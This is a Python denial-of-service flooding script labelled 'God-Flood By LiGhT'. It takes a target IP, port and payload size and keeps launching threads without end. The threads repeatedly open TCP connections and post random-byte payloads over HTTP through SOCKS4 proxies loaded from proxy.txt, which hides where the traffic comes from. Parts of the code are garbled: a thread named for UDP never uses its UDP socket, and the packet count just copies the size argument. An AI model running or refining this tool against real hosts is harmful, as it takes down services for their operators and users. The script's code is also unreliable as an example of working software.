import threading
import sys
import time
import random
import socket
import requests

if len(sys.argv) < 4:
    print("God-Flood By LiGhT")
    sys.exit("Usage: python " + sys.argv[0] + " <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class SynThread(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class TcpThread(threading.Thread):
    def __init__(self, ip, port, size, packets, proxies):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.proxies = proxies
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                bytes_data = random._urandom(self.size)
                proxy = random.choice(self.proxies)
                requests.post(f"http://{self.ip}:{self.port}", data=bytes_data, proxies={"http": f"socks4://{proxy}"})
            except:
                pass

class UdpThread(threading.Thread):
    def __init__(self, ip, port, size, packets, proxies):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.proxies = proxies
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                bytes_data = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                proxy = random.choice(self.proxies)
                requests.post(f"http://{self.ip}:{self.port}", data=bytes_data, proxies={"http": f"socks4://{proxy}"})
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        with open('proxy.txt', 'r') as proxy_file:
            proxies = [line.strip() for line in proxy_file]

        u = UdpThread(ip, port, size, packets, proxies)
        t = TcpThread(ip, port, size, packets, proxies)
        s = SynThread(ip, port, packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print("Stopping Flood!")
        sys.exit()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()
